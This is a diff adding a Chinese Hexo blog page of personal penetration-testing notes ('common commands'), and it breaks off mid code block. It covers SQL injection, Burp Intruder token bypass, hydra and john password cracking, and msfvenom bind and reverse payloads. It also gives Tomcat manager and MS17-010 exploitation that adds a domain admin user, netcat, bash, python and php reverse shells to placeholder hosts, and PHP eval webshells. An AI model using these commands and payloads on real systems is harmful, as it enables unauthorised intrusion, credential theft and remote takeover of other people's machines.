@@ -1,0 +1,1050 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>他的国</title>
+	<meta charset="utf-8">
+
+	<!-- 引入配置文件 -->
+	
+<link rel="stylesheet" href="/css/main.css">
+
+
+	<!-- 字体图片库 -->
+	
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+	<!-- 代码高亮库 -->
+	
+<link rel="stylesheet" href="/lib/highlight/styles/atom-one-dark.css">
+
+
+	
+<meta name="generator" content="Hexo 5.3.0"></head>
+<body>
+
+	<div id="main">
+		<!-- 引入侧边栏 -->
+		<aside>
+			<!-- 搜索栏 -->
+<div id="search">
+	<input class="search-input" type="text" placeholder="search">
+	<i id="search-icon" class="fa fa-bars" title="切换目录与索引">
+</div>
+
+<!-- 侧边目录栏 -->
+<div id="tree">
+	
+
+	
+					<ul>
+						<li class="file">
+							<a href="/2021/01/01/ReadMe/">
+								<i class="fa fa-file"></i>
+								ReadMe
+							</a>
+						</li>
+					</ul>
+	
+					<ul>
+						<li class="file active">
+							<a href="/2021/03/02/★常用命令/">
+								<i class="fa fa-file"></i>
+								★常用命令
+							</a>
+						</li>
+					</ul>
+	
+					<ul>
+						<li class="directory">
+							<a href="#" class="directory">
+								<i class="fa fa-folder"></i>
+								东塔笔记
+							</a>
+							
+					<ul>
+						<li class="file">
+							<a href="/2021/11/02/东塔笔记/20201102【笔记】Docker/">
+								<i class="fa fa-file"></i>
+								20201102【笔记】Docker
+							</a>
+						</li>
+					</ul>
+	
+						</li>
+						
+					</ul>
+	
+					<ul>
+						<li class="directory">
+							<a href="#" class="directory">
+								<i class="fa fa-folder"></i>
+								漏洞
+							</a>
+							
+					<ul>
+						<li class="directory">
+							<a href="#" class="directory">
+								<i class="fa fa-folder"></i>
+								中间件
+							</a>
+							
+					<ul>
+						<li class="file">
+							<a href="/2020/11/27/漏洞/中间件/ThinkAdmin6_DT&FR/">
+								<i class="fa fa-file"></i>
+								ThinkAdmin6_DT&FR
+							</a>
+						</li>
+					</ul>
+	
+						</li>
+						
+					</ul>
+	
+					<ul>
+						<li class="directory">
+							<a href="#" class="directory">
+								<i class="fa fa-folder"></i>
+								操作系统
+							</a>
+							
+					<ul>
+						<li class="file">
+							<a href="/2021/01/20/漏洞/操作系统/win10_BSOD/">
+								<i class="fa fa-file"></i>
+								win10_BSOD
+							</a>
+						</li>
+					</ul>
+	
+						</li>
+						
+					</ul>
+	
+						</li>
+						
+					</ul>
+	
+</div>
+
+
+<!-- 最尾部添加，这里就不列以前的代码了 -->
+<div id="toc" style="display: none;"></div>
+
+		</aside>
+
+		<!-- 引入导航 -->
+		<nav>
+			<ul id="menu">
+	
+	
+    <li class="menu-item">
+        <a href="/" class="menu-item-link">主页</a>
+    </li>
+    
+    <li class="menu-item">
+        <a href="/about" class="menu-item-link">关于</a>
+    </li>
+    
+
+    
+    
+
+</ul>
+
+		</nav>
+
+		<!-- 引入正文 -->
+		<div id="content">
+			<div>
+	<span id="post-author">求幂级数的收敛域</span>
+	<span id="post-date">2021-03-02 14:54:44</span>
+</div>
+
+<div id="article">
+	<h1 id="ACCESS"><a href="#ACCESS" class="headerlink" title="ACCESS"></a>ACCESS</h1><h2 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h2><p>ACCESS没有数据库，只有一张一张的表</p>
+<p>拿SQLMAP跑，只能用字典爆破表名和列名</p>
+<p>select [列名],[列名] from [表名]</p>
+<p>?id=1 union select 1,2,3 from admin            //注入时一定要加表名</p>
+<p><img src="https://i.loli.net/2021/02/26/4alG1j6ANqiuS7C.png" alt="image-20201106105001552"></p>
+<hr>
+<h1 id="Burp"><a href="#Burp" class="headerlink" title="Burp"></a>Burp</h1><h2 id="四种攻击方式"><a href="#四种攻击方式" class="headerlink" title="四种攻击方式"></a>四种攻击方式</h2><p><strong>①sniper</strong></p>
+<p>例如：原始请求中</p>
+<p> name=aa , password=bb，</p>
+<p>字典:</p>
+<p>{ 1 ,2 };</p>
+<p>那么会产生四个请求：</p>
+<p>name=1 , password=bb</p>
+<p>name=2 , password=bb</p>
+<p>name=aa , password=1</p>
+<p>name=aa , password=2</p>
+<p><strong>②battering ram</strong></p>
+<p>例如：原始请求中</p>
+<p> name=aa , password=bb，</p>
+<p>字典:</p>
+<p>{ 1 ,2 };</p>
+<p>那么会产生两个请求：</p>
+<p>name=1 , password=1</p>
+<p>name=2, password=2</p>
+<p><strong>③pitchfork</strong></p>
+<p>例如：原始请求中</p>
+<p> name=aa , password=bb，</p>
+<p>字典:</p>
+<p>payload1={ 1 ， 2 }， payload2={ 3 , 4 ， 5 }</p>
+<p>那么会产生两个请求：</p>
+<p>name=1 , password=3</p>
+<p>name=2 , password=4</p>
+<p><strong>④cluster bomb</strong></p>
+<p>例如：原始请求中</p>
+<p> name=aa , password=bb，</p>
+<p>字典:</p>
+<p>payload1={ 1 ， 2 }， payload2={ 3 , 4 ， 5 }</p>
+<p>那么会产生两个请求：</p>
+<p>name=1 , password=3</p>
+<p> name=1 , password=4</p>
+<p> name=1 , password=5</p>
+<p>name=2 , password=3</p>
+<p>name=2 , password=4</p>
+<p>name=2 , password=5</p>
+<h2 id="实现token绕过"><a href="#实现token绕过" class="headerlink" title="实现token绕过"></a>实现token绕过</h2><p>抓取返回包里的token值放入下一个请求包中</p>
+<p><img src="https://i.loli.net/2021/02/26/yqLap8X5Gz3IuRo.png" alt="image-20201118152743534"></p>
+<p>模式选择Pitchfork</p>
+<p><img src="https://i.loli.net/2021/02/26/kwEMNTRnSs3i8Gb.png" alt="image-20201118152803249"></p>
+<p>线程调为1</p>
+<p><img src="https://i.loli.net/2021/02/26/1ytjOQRWfl2Ypeu.png" alt="image-20201118152709803"></p>
+<p><img src="https://i.loli.net/2021/02/26/DitbjaLR1sE4HqW.png" alt="image-20201118153109067"></p>
+<p><img src="https://i.loli.net/2021/02/26/hUGvDqoMJnmCKBW.png" alt="image-20201118153221318"></p>
+<p>之前选好Grep就会自动传进来参数</p>
+<p>可以不写初始值</p>
+<p><img src="https://i.loli.net/2021/02/26/1gOoMlwNefyjBiR.png" alt="image-20201118153756924"></p>
+<p>从下图可以看出，前两个payload的token是无效的，所以修改set 1的payload，将第一行的值再添加一遍</p>
+<p><img src="https://i.loli.net/2021/02/26/fYlNk4OrTq1xA9E.png" alt="image-20201118155330972"></p>
+<p>可以看到成功绕过token</p>
+<p><img src="https://i.loli.net/2021/02/26/8tS1WYxIREPfLK5.png" alt="image-20201118155645558"></p>
+<hr>
+<h1 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a>常用端口</h1><table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>协议</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>21</td>
+<td>FTP - 文件传输</td>
+</tr>
+<tr>
+<td>22</td>
+<td>SSH - Secure SHELL，安全远程登录</td>
+</tr>
+<tr>
+<td>23</td>
+<td>telnet - 远程登录</td>
+</tr>
+<tr>
+<td>53</td>
+<td>DNS - 域名解析</td>
+</tr>
+<tr>
+<td>80</td>
+<td>http - 超文本传输</td>
+</tr>
+<tr>
+<td>443</td>
+<td>https - 带SSL的超文本传输，SecureSocket Layer</td>
+</tr>
+<tr>
+<td>445</td>
+<td>共享文件夹 →MS17-010</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>msSQL - 微软的SQLServer</td>
+</tr>
+<tr>
+<td>1521</td>
+<td>Oracle</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>MySQL</td>
+</tr>
+<tr>
+<td>3389</td>
+<td>RDP - 远程桌面协议</td>
+</tr>
+<tr>
+<td>7001</td>
+<td>Weblogic</td>
+</tr>
+<tr>
+<td>8080</td>
+<td>www代理 / Apache Tomcat</td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="DIRMAP"><a href="#DIRMAP" class="headerlink" title="DIRMAP"></a>DIRMAP</h1><p>项目地址</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a></p>
+<p>使用 单个目标</p>
+<pre><code>$ python3 dirmap.py -i https://site.com -lcf
+ -i TARGET    scan a target or network
+            (e.g. [http://]target.com , 192.168.1.1[/24] , 192.168.1.1-192.168.1.100)
+ -lcf, --loadConfigFile        Load the configuration through the configuration file
+</code></pre>
+<p>多个目标</p>
+<pre><code>$ python3 dirmap.py -iF urls.txt -lcf
+ -iF FILE        load targets from targetFile (e.g. urls.txt)
+</code></pre>
+<hr>
+<h1 id="谷歌语法"><a href="#谷歌语法" class="headerlink" title="谷歌语法"></a>谷歌语法</h1><pre><code>inurl:upload site:xxx.com
+inurl:?id=1 site:xxx.com
+inurl:?file= site:xxx.com
+
+intitle:后台 site:xxx.com
+</code></pre>
+<hr>
+<h1 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h1><p>hexo clean    //清除之前生成的内容</p>
+<p>hexo g – hexo generate    //生成静态文章</p>
+<p>hexo d – hexo deploy    //部署文章</p>
+<hr>
+<h1 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h1><h2 id="常用命令（泛Linux）"><a href="#常用命令（泛Linux）" class="headerlink" title="常用命令（泛Linux）"></a>常用命令（泛Linux）</h2><p><strong>查看系统版本</strong></p>
+<pre><code>###kali###
+grep Version /etc/os-release
+
+###Ubuntu###
+cat /proc/version
+</code></pre>
+<p><img src="https://i.loli.net/2021/02/23/TC82mXZ7WIBO3Fe.png"></p>
+<p><strong>ping</strong></p>
+<p>ping [IP] -c 3    //ping 3次</p>
+<p><strong>远程连接</strong></p>
+<pre><code>&gt; rdesktop &lt;IP&gt;
+</code></pre>
+<p><strong>查看某一端口的使用情况</strong></p>
+<pre><code>&gt;lsof -i:8000
+</code></pre>
+<p><img src="https://i.loli.net/2021/02/26/aoWvDKtVyYSBXLM.png" alt="image-20210226144101873"></p>
+<p><strong>查看端口、PID、进程</strong></p>
+<pre><code>&gt; netstat -pantu
+</code></pre>
+<p><strong>查看历史命令</strong></p>
+<pre><code>&gt; history    //查看历史命令
+&gt; history -c //清除历史命令
+
+在zsh中使用history -c 会报错，使用
+&gt; cat .zsh_history 查看历史命令文件内容
+&gt; rm .zsh_hhistory 删除历史命令
+</code></pre>
+<p><strong>查看所有用户</strong></p>
+<p>三种方法</p>
+<pre><code>1.使用/etc/passwd文件
+&gt; cat /etc/passwd
+    你可以使用 awk 或 cut 命令仅打印出 Linux 系统中所有用户的用户名列表。显示的结果是相同的。
+    &gt; awk -F&#39;:&#39; &#39;&#123; print $1&#125;&#39; /etc/passwd
+    或者
+    &gt; cut -d: -f1 /etc/passwd
+
+2.使用getent命令
+&gt; getent passwd
+    getent 命令显示类似于 /etc/passwd 文件的用户详细信息，它将每个用户详细信息显示为包含七个字段的单行。
+
+3.使用compgen
+&gt; compgen -u
+    compgen 是 bash 的内置命令，-u只显示用户名列表。
+</code></pre>
+<h3 id="shadow文件"><a href="#shadow文件" class="headerlink" title="shadow文件"></a>shadow文件</h3><p>/etc/passwd文件保存了系统中所有用户信息（除密码）</p>
+<pre><code>【格式】用户名：密码占位符：UID：groupID：用户信息：家目录：shell类型（/sbin/nologin 表示该用户无法登录系统）
+【eg】root:x:0:0:root:/root:/usr/bin/zsh
+</code></pre>
+<p>/etc/shadow文件保存了系统中所有用户的密码信息</p>
+<pre><code>【格式】
+用户名：加密密码：
+最后一次修改时间：最小修改时间间隔：
+密码有效期：密码需要变更前的警告天数：
+密码过期后的宽限时间：账号失效时间：保留字段
+【eg】root:$6$j42TBSODDYWE2EOi$bfpfo2uvj4QZY4nWepxMy/9Qdm7wZdU8ldka857sgL1o5e81/zl6kpxdmQ/UFZiu6a9/0b5fF1G3K87MxQDPW0:
+18599:0:
+99999:7:
+::
+</code></pre>
+<h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><p>ftp &lt;目标机IP&gt;</p>
+<p>会提示输入用户名、密码</p>
+<p><img src="https://i.loli.net/2021/02/26/zXTS7Ze9aiEWwJA.png" alt="image-20201218105801156"></p>
+<p>ftp是一个文件传输服务，设计它的目的就是为了传输文件。它有独立的守护进程，使用20，21两个端口，20是数据链路的端口，21是控制链路的端口。</p>
+<h3 id="sftp"><a href="#sftp" class="headerlink" title="sftp"></a>sftp</h3><p>sftp [用户名]@&lt;目标机IP&gt;</p>
+<p>eg: sftp <a href="mailto:&#x61;&#x64;&#x6d;&#x69;&#110;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#x36;&#46;&#49;&#x35;">&#x61;&#x64;&#x6d;&#x69;&#110;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#x36;&#46;&#49;&#x35;</a></p>
+<p>sftp也是用来传输文件的，但它的传输是加密的，是ssh服务的一部分，没有单独的守护进程，是ssh服务的一部分，可以看做是ssh服务文件传输方案。和ssh一样，使用22端口。</p>
+<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>Secure Shell</p>
+<pre><code>ssh [用户名]@[IP]
+-p 指定端口
+-f 后台运行
+-N 不回弹shell，只执行命令
+
+-L 本地端口转发 -L [A主机端口]:[C主机IP]:[C服务端口]
+-R 远程端口转发 -R [B主机端口]:[A1主机IP]:[A1服务端口]
+-D 动态端口转发 -R [A主机端口] + 浏览器SOCKS4/5代理设置
+</code></pre>
+<p>修改配置文件</p>
+<pre><code>路径    /etc/ssh/sshd_config    root权限读写
+cat&gt;&gt;sshd_config //将内容追加到文件结尾
+AllowUsers XXX    //允许XXX用户登录SSH
+
+ctrl + D 退出 //meterpreter里Ctrl + C结束进程重新进
+
+sed -i &#39;$d&#39; sshd_config    //删除最后一行
+
+修改完要重启ssh服务
+service sshd status
+service sshd restart
+
+# 或者
+/etc/initd.d/sshd restart
+</code></pre>
+<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><pre><code>不带任何参数时，curl就是发出GET请求
+&gt; curl https://www.example.com
+&gt; curl localhost:80
+</code></pre>
+<h3 id="网卡IP配置"><a href="#网卡IP配置" class="headerlink" title="网卡IP配置"></a>网卡IP配置</h3><p>配置静态IP</p>
+<pre><code>第一步：配IP
+vim /etc/network/interfaces
+
+加入以下内容
+inface eth0 inet static    #设置 eth0 使用默认的静态地址
+address 10.10.10.160   #设置 eth0 的ip 地址
+gateway 10.10.10.2    #配置当前主机的默认网关
+netmask  255.255.255.0   #设置 eth0 的子网掩码
+
+第二步：配DNS
+vim /etc/resolv.conf
+
+加入以下内容
+domain
+nameserver 8.8.8.8
+nameserver 114.114.114.114
+search localdomain
+
+第三步：重启网卡
+ifconfig eth0 down
+ifconfig eth0 up
+</code></pre>
+<p>双网卡配置</p>
+<p><img src="https://i.loli.net/2021/02/26/wYK3mJzBI7McZs5.png" alt="image-20201211095057215"></p>
+<p>两张网卡都有IP</p>
+<p><img src="https://i.loli.net/2021/02/26/ZC2HPgLdRErjikM.png" alt="image-20201211095237732"></p>
+<h3 id="重启网卡"><a href="#重启网卡" class="headerlink" title="重启网卡"></a>重启网卡</h3><pre><code>&gt; systemctl restart network
+或
+&gt; service network-manager restart
+
+###Kali Linux (Debain)###
+&gt; service networking restart
+
+###CentOS 8###
+&gt; nmcli c reload
+</code></pre>
+<h2 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h2><p><strong>爆破ftp</strong></p>
+<p>hydra -l user -P passlist.txt <a href="ftp://192.168.10.121/">ftp://192.168.10.121</a></p>
+<p>hydra ip ftp -L userlist.txt -P passlist.txt -t 线程(默认16) -vV</p>
+<p><strong>爆破MySQL</strong></p>
+<p>hydra -L [username.txt] -P [password.txt] 192.168.11.10 mysql</p>
+<h2 id="john破解shadow"><a href="#john破解shadow" class="headerlink" title="john破解shadow"></a>john破解shadow</h2><p>直接将目标机的shadow内容粘贴出来，保存为1</p>
+<p>kali &gt; john 1</p>
+<h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>打开</p>
+<pre><code>kali&gt;
+msfconsole
+</code></pre>
+<p><img src="https://i.loli.net/2021/02/26/C1LuvjlZ5Gz7BXH.png" alt="image-20210226133931183"></p>
+<p>查看当前任务</p>
+<p>msf &gt; jobs</p>
+<p>kill [job id]</p>
+<p>设置目标</p>
+<p>msf exp(xx模块) &gt; show targets</p>
+<p>0 windows x86</p>
+<p>1 windows x64</p>
+<p>msf exp(xx模块) &gt; set target 1</p>
+<h3 id="直连木马"><a href="#直连木马" class="headerlink" title="直连木马"></a>直连木马</h3><p>生成木马</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=7777 -f exe -o /home/kali/SysEventCertificate.exe
+</code></pre>
+<p><img src="https://i.loli.net/2021/02/26/YJ7Zw92lSqDMCLF.png" alt="image-20201211180850030"></p>
+<p>起监听</p>
+<p><img src="https://i.loli.net/2021/02/26/UI6hgvX8aRGrn9x.png" alt="image-20201211175712601"></p>
+<h3 id="打8080-Tomcat-Manager"><a href="#打8080-Tomcat-Manager" class="headerlink" title="打8080 Tomcat Manager"></a>打8080 Tomcat Manager</h3><pre><code>msf &gt; 
+search tomcat_mgr
+</code></pre>
+<p><img src="https://i.loli.net/2021/02/26/DXBOcq1C9fM5S2I.png" alt="image-20201216201232261"></p>
+<p>起手 爆用户名/口令</p>
+<pre><code>use auxiliary/scanner/http/tomcat_mgr_login
+</code></pre>
+<p><img src="https://i.loli.net/2021/02/26/EIJgyxoGjUM4chb.png" alt="image-20201216194421355"></p>
+<p>get shell的三种方法</p>
+<p>①deploy漏洞（难利用）</p>
+<pre><code>use auxiliary/scanner/http/tomcat_mgr_deploy
+</code></pre>
+<p>可能的失败</p>
+<p><img src="https://i.loli.net/2021/02/26/uOdlBnzRUreIjfZ.png" alt="image-20201216202613482"></p>
+<p>②upload漏洞（难利用）</p>
+<pre><code>use auxiliary/scanner/http/tomcat_mgr_upload
+</code></pre>
+<p>可能的失败</p>
+<p><img src="https://i.loli.net/2021/02/26/SHBGMebrcaCpRL2.png" alt="image-20201216202915676"></p>
+<p>③生成war木马回连</p>
+<pre><code>msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.6.10 LPORT=8904 -f war -o /home/kali/jbh.war
+</code></pre>
+<p><img src="https://i.loli.net/2021/02/26/1P46bripLnA5sjk.png" alt="image-20201216211347396"></p>
+<p><img src="https://i.loli.net/2021/02/26/XKCdSZM9VzrmQp3.png" alt="image-20201216204611276"></p>
+<p>msf启监听，在网页点击上传的文件，瞬间回弹shell</p>
+<p><img src="https://i.loli.net/2021/02/26/9msKtpbOcnrvR3a.png" alt="image-20201216211605280"></p>
+<h3 id="17-010打445"><a href="#17-010打445" class="headerlink" title="17-010打445"></a>17-010打445</h3><p>use 0的时候set command ‘xxx’</p>
+<p>当命令本身含有双引号时，要加单引号</p>
+<pre><code>set command &#39;net user jbh Nihao12! /add&#39;
+set command &#39;net &quot;Domain Admins&quot; jbh /add /domain&#39;
+</code></pre>
+<h3 id="meterpreter上传文件"><a href="#meterpreter上传文件" class="headerlink" title="meterpreter上传文件"></a>meterpreter上传文件</h3><p>upload &lt;路径\文件&gt; &lt;路径&gt;</p>
+<h2 id="searchsploit提权"><a href="#searchsploit提权" class="headerlink" title="searchsploit提权"></a>searchsploit提权</h2><p>用于Linunx 提权，配合meterpreter上传文件</p>
+<p><img src="https://i.loli.net/2021/02/26/KUoqPWjy71sExrf.png" alt="image-20201218102914342"></p>
+<pre><code>root &gt;
+searchsploit linux kernel 4.4.0
+searchsploit -p 40871.c    查看漏洞简略信息
+searchsploit -m 40871.c 复制.c文件到当前路径
+</code></pre>
+<hr>
+<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="版本相关"><a href="#版本相关" class="headerlink" title="版本相关"></a>版本相关</h2><p>mysql版本&lt;5.0没有information_schema数据库</p>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>show databases;</p>
+<p>use information_schema;</p>
+<p>use mysql;        //切换数据库</p>
+<p>show tables;</p>
+<p>select version();        //当前数据库版本</p>
+<p>select database();        //当前数据库名</p>
+<p>select user();        //当前MySQL用户名</p>
+<p>@@datadir;        //读取数据库路径</p>
+<p>group_concat()        将查询的所有结果拼接为一个字段，用”,”分割</p>
+<h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><pre><code>1、限制mysqld 不允许导入、导出
+secure_file_priv=null 或
+secure_file_priv
+
+2、限制mysqld 的导入、导出，只能发生在/tmp/目录下
+secure_file_priv=/tmp/
+
+3、不对mysqld 的导入、导出做限制
+secure_file_priv=
+重启生效
+</code></pre>
+<p>读文件</p>
+<pre><code>路径需转义 D:/或者D:\\
+
+select load_file(&quot;D:\\1.txt&quot;)
+
+select &quot;&lt;?php phpinfo();?&gt;&quot; into outfile &quot;D:\\1.php&quot;
+</code></pre>
+<h2 id="数据库结构-1"><a href="#数据库结构-1" class="headerlink" title="数据库结构"></a>数据库结构</h2><p>有【库】information_schema</p>
+<p>【表】information_schema.schemata</p>
+<p>​            【列】schema_name    </p>
+<p><img src="https://i.loli.net/2021/02/26/6qp25HZ3ie9cGKk.png" alt="image-20201106194443894"></p>
+<p>【表】information_schema.tables</p>
+<p>​            【列】table_name</p>
+<p>​            【列】table_schema</p>
+<p><img src="https://i.loli.net/2021/02/26/wnQDqmthrNpbZoj.png" alt="image-20201106194936512"></p>
+<p>【表】information_schema.columns</p>
+<p>​            【列】column_name</p>
+<p>​            【列】table_schema</p>
+<p>​            【列】table_name</p>
+<p><img src="https://i.loli.net/2021/02/26/lgVHMdE9GvNom2Z.png" alt="image-20201106195637688"></p>
+<p>拿SQLMAP跑，可以准确地按照字符跑出来表名列名</p>
+<h2 id="mysql外部连接"><a href="#mysql外部连接" class="headerlink" title="mysql外部连接"></a>mysql外部连接</h2><p>mysql是多服务器端的数据库，但默认是不允许外连的</p>
+<p><img src="https://i.loli.net/2021/02/26/jhaGwVlg7EX6z3D.png" alt="image-20201106114010345"></p>
+<p>错误信息: SQL Error (1130): Host ‘TideSec-PC’ is not allowed to connect to this MySQL server<br>说明所连接的用户帐号没有远程连接的权限，只能在本机(localhost)登录。</p>
+<p><img src="https://i.loli.net/2021/02/26/kNXvTy6nIwBR8VY.png" alt="image-20201106121027639"></p>
+<p>需更改 mysql 数据库里的 user表里的 host项<br>把localhost改称%</p>
+<p><img src="https://i.loli.net/2021/02/26/mXK6FYTxoiaqV7l.png" alt="image-20201106150329811"></p>
+<p>登录mysql服务器，执行以下命令</p>
+<pre><code>mysql&gt;use mysql;
+mysql&gt;update user set host = ‘%’ where user =’root’;
+mysql&gt;flush privileges;
+mysql&gt;quit
+</code></pre>
+<p>然后外连目标主机，在相对路径”MySQL\bin”下打开命令行</p>
+<p><img src="https://i.loli.net/2021/02/26/rLGhVKNXxObftyE.png" alt="image-20201106120626880"></p>
+<pre><code>mysql -h [目标主机名] -uroot -P [端口]    -p
+</code></pre>
+<p><img src="https://i.loli.net/2021/02/26/9O2NgIPBp4ejqTE.png" alt="image-20201106120519758"></p>
+<h2 id="mysql-用户账号密码存储位置"><a href="#mysql-用户账号密码存储位置" class="headerlink" title="mysql 用户账号密码存储位置"></a>mysql 用户账号密码存储位置</h2><pre><code>相对路径&quot;MySQL\data\mysql&quot;
+</code></pre>
+<p><img src="https://i.loli.net/2021/02/26/poURmFHSQPXjV1a.png" alt="image-20201106114432103"></p>
+<p>mysql自带 [库]mysql [表]users 可以看到用户名和密码的MD5值</p>
+<pre><code>select * from user\G            //\G可以显示得很整齐
+</code></pre>
+<p><img src="https://i.loli.net/2021/02/26/6IxJa7YtPM3XLoc.png" alt="image-20201106115343823"></p>
+<p>用从 靶机拷贝到的文件 替换掉 本地文件，也可拿到MD5</p>
+<p><img src="https://i.loli.net/2021/02/26/N3KMnL5TPGHb4Ww.png" alt="image-20201106115200439"></p>
+<hr>
+<h1 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h1><h2 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h2><p><img src="https://i.loli.net/2021/02/26/geivLYG3hFdOzkJ.png" alt="image-20201203165946801"></p>
+<pre><code>Windows下传shell用 -e cmd
+Linux下传shell用 -c bash
+
+要拿谁的shell就在谁的主机上输入 -c bash
+-v 显示详细信息，该参数可省略
+-n 不执行任何地址、主机名、端口、DNS查询，该参数可省略
+-p 指定nc使用的源端口，受权限限制（某些版本不能与-l一起使用）
+-l 监听
+
+监听方向也可以选择
+reverse(Alice → Oscar)
+O:nc -vlp 6677
+A:nc -v 192.168.10.188 6677 -e cmd
+</code></pre>
+<p><img src="https://i.loli.net/2021/02/26/JqVsOik8aSbYZIP.png" alt="image-20210108152916896"></p>
+<pre><code>bind(Oscar → Alice)
+A:nc -vlp 7788 -e cmd
+O:nc -nv 192.168.10.212 7788 
+</code></pre>
+<p><img src="https://i.loli.net/2021/02/26/38oBcPKY9ZxviAk.png" alt="image-20210108153424100"></p>
+<p>如果靶机没装NC，可以用下面几种方法（与nc配合使用）</p>
+<h2 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h2><pre><code>一般用于linux回连shell
+
+reverse(Alice → Oscar)
+A:/bin/bash -i &gt;&amp; /dev/tcp/&lt;Oscar_IP&gt;/8899 0&gt;&amp;1
+O:nc -vlp 8899 
+</code></pre>
+<p><img src="https://i.loli.net/2021/02/26/h3XINP2FMYd5lk7.png" alt="image-20201215173912996"></p>
+<p><img src="https://i.loli.net/2021/02/26/pYjKIDGdSC4HqiP.png" alt="image-20201215173350362"></p>
+<h2 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h2><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;your_vps&gt;&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
+</code></pre>
+<p><img src="https://i.loli.net/2021/02/26/GI9k4iO8ert26Js.png" alt="image-20201215173331235"></p>
+<h2 id="php反弹shell"><a href="#php反弹shell" class="headerlink" title="php反弹shell"></a>php反弹shell</h2><pre><code>php -r &#39;$sock=fsockopen(&quot;&lt;your_vps&gt;&quot;,6666);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
+</code></pre>
+<hr>
+<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><h2 id="man手册"><a href="#man手册" class="headerlink" title="man手册"></a>man手册</h2><p>man nmap</p>
+<h2 id="通用命令"><a href="#通用命令" class="headerlink" title="通用命令"></a>通用命令</h2><table>
+<thead>
+<tr>
+<th>主机发现</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-sL</td>
+<td>List Scan，仅将目标IIP列举出来，不进行主机发现</td>
+</tr>
+<tr>
+<td>-sn</td>
+<td>Ping扫描，只进行主机发现，不进行端口扫描</td>
+</tr>
+<tr>
+<td>-Pn</td>
+<td>将所有主机视为开启状态，跳过主机发现</td>
+</tr>
+<tr>
+<td>–traceroute</td>
+<td>追踪每个路由节点</td>
+</tr>
+</tbody></table>
+<p>nmap -sL List Scan</p>
+<p>nmap -sS 192.168.96.4    //SYN扫描,使用最频繁,安全,快</p>
+<p>nmap -sS -P0 -sV -O [target]</p>
+<p>这里的 [target] 可以是单一 IP, 或主机名，或域名，或子网</p>
+<p>-sS TCP SYN 扫描 (又称半开放,或隐身扫描)<br>-P0 允许你关闭 ICMP pings.<br>-sV 打开系统版本检测<br>-O 尝试识别远程操作系统</p>
+<p>其它选项:</p>
+<p>-A 同时打开操作系统指纹和版本检测<br>-v 详细输出扫描情况.</p>
+<p>-p 1-65535 指定扫描端口</p>
+<pre><code>nmap -sS -P0 -A -V 14.215.158.101
+</code></pre>
+<hr>
+<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="版本相关-1"><a href="#版本相关-1" class="headerlink" title="版本相关"></a>版本相关</h2><p>5.3.4以上版本，00截断（上传文件）无法使用</p>
+<p>7.0以上版本，中国菜刀无法连接</p>
+<h2 id="php-ini安全配置"><a href="#php-ini安全配置" class="headerlink" title="php.ini安全配置"></a>php.ini安全配置</h2><p><img src="https://i.loli.net/2021/03/02/8ZzsDWLRJ6VNPFU.png" alt="image-20201106152658865"></p>
+<p>disable_functions = assert,eval,phpinfo</p>
+<p><strong>①assert</strong></p>
+<pre><code>&lt;?php @assert($_POST[&#39;a&#39;]);?&gt;
+</code></pre>
+<p>无法连接，disable_functions 对 assert 函数是有效的</p>
+<p><strong>②eval</strong></p>
+<pre><code>&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;
+</code></pre>
+<p>可以连接，disable_functions 对 eval 函数是无效的，可以考虑关闭端口来防御</p>
+<p><strong>③phpinfo</strong></p>
+<p>disable_functions 有效</p>
+<p><img src="https://i.loli.net/2021/03/02/CriDyO1fHvxu5lL.png" alt="image-20201106155146663"></p>
+<p>php在线代码测试工具：<a target="_blank" rel="noopener" href="http://www.dooccn.com/php7/">http://www.dooccn.com/php7/</a></p>
+<h2 id="文件写入函数"><a href="#文件写入函数" class="headerlink" title="文件写入函数"></a>文件写入函数</h2><p><strong>1、fputs()</strong></p>
+<p><strong>定义和用法</strong></p>
+<p>fputs()函数写入文件（可安全用于二进制文件）</p>
+<p>fputs()函数是fwrite()函数的别名</p>
+<p>语法</p>
+<pre><code class="php">&lt;?php
